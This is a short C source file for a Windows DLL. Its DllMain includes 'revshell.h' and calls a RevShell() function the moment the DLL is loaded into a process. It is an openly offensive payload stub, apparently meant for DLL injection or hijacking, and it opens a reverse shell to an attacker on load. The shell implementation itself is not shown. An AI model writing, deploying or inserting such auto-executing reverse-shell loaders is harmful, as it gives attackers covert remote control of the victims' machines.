#include <Windows.h>
#include "revshell.h"

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReserved)
{
	switch (fwdReason)
	{
	case DLL_PROCESS_ATTACH:
		RevShell();
	case DLL_PROCESS_DETACH:
		break;
	default:
		break;
	}
}